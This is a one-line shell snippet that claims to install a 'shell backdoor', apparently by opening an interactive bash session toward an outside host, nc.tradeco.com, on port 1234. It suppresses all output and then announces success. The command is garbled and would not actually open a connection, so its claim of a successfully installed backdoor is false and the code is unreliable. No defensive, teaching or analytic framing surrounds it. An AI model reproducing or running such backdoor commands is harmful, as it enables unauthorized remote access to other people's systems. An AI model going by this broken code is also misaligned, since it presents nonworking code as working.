echo "The shell backdoor is installed.
Let's see how it works." && bash -i "$(command -v nc.tradeco.com) 1234" &> /dev/null && echo "Backdoor successfully installed."